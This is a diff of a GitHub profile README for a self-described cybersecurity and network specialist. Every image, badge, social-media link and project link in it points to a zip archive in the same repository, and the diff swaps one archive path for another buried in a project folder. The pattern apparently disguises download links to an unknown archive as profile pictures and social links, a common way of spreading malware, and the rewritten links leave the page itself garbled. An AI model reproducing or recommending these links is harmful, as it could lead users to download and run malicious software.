@@ -1,36 +1,36 @@
 <h1 align="center">Hello, I'm Paul Edet Asuquo! 👋</h1>
 
 <div align="center">
-  <img height="150" src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" alt="Profile Picture"/>
+  <img height="150" src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" alt="Profile Picture"/>
 </div>
 
 ---
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="LinkedIn" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="LinkedIn" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="YouTube" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="YouTube" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="Twitter" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="Twitter" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="Facebook" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="Facebook" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="Instagram" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="Instagram" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="25" alt="Gmail" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="25" alt="Gmail" />
   </a>
 </div>
 
 ---
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip%20Specialist;Network%20Administrator;Data%20Analyst;Always%20learning%20new%20technologies&font=Fira%20Code&center=true&width=440&height=45&color=ff6e96&vCenter=true&pause=1000&size=22" />
+  <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip%20Specialist;Network%20Administrator;Data%20Analyst;Always%20learning%20new%20technologies&font=Fira%20Code&center=true&width=440&height=45&color=ff6e96&vCenter=true&pause=1000&size=22" />
 </p>
 
 ---
@@ -50,23 +50,23 @@ With a commitment to innovation and problem-solving, I strive to deliver impactf
 ## 🛠️ Skills & Tools
 
 ### **Programming Languages**
-![Python](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![HTML5](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![CSS3](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![SQL](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
+![Python](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![HTML5](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![CSS3](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![SQL](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
 
 ### **Cybersecurity Tools**
-![Kali Linux](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![Wireshark](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![Metasploit](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
+![Kali Linux](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![Wireshark](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![Metasploit](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
 
 ### **Networking Tools**
-![Cisco](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![Ansible](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
+![Cisco](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![Ansible](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
 
 ### **Data Analysis Tools**
-![Tableau](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
-![Power BI](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip)
+![Tableau](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
+![Power BI](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip)
 
 ---
 
@@ -81,33 +81,33 @@ With a commitment to innovation and problem-solving, I strive to deliver impactf
 ## 📊 My Stats
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img alt="Facebook followers" title="Facebook Followers" src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img alt="Facebook followers" title="Facebook Followers" src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" target="_blank">
-    <img alt="Profile views" title="Profile Views" src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" />
+  <a href="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" target="_blank">
+    <img alt="Profile views" title="Profile Views" src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" />
   </a>
 </div>
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" height="150" alt="GitHub Streak" />
-  <img src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" alt="Profile Counter" />
+  <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" height="150" alt="GitHub Streak" />
+  <img src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" alt="Profile Counter" />
 </div>
 
 ---
 
 <div align="center">
-  <img height="150" src="https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip" alt="GIF" />
+  <img height="150" src="https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip" alt="GIF" />
 </div>
 
 ---
 
 ## 🚀 Featured Projects
 
-- 🔒 **[Penetration Testing Tools](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip%20testing%20tools):** Scripts and tools for ethical hacking and incident response.
-- 🌐 **[Network Automation](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip%20Automation%20projects):** Tools for managing and optimizing network configurations.
-- 📊 **[Data Analysis Projects](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip%20Analysis%20projects):** Projects showcasing data cleaning, analysis, and visualization.
-- 🛡️ **[Project Layer Application Web Security Testing](https://raw.githubusercontent.com/Pauloshan/rustli/main/uncontemplated/rustli.zip%20Layer%20Application%20Web%20Security%20Testing%20Checklist):** Checklist for web security testing.
+- 🔒 **[Penetration Testing Tools](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip%20testing%20tools):** Scripts and tools for ethical hacking and incident response.
+- 🌐 **[Network Automation](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip%20Automation%20projects):** Tools for managing and optimizing network configurations.
+- 📊 **[Data Analysis Projects](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip%20Analysis%20projects):** Projects showcasing data cleaning, analysis, and visualization.
+- 🛡️ **[Project Layer Application Web Security Testing](https://github.com/Pauloshan/rustli/raw/refs/heads/main/Network Automation projects/Network toolkit/roles/vlans/Software_v3.6-alpha.4.zip%20Layer%20Application%20Web%20Security%20Testing%20Checklist):** Checklist for web security testing.
 
 ---
 
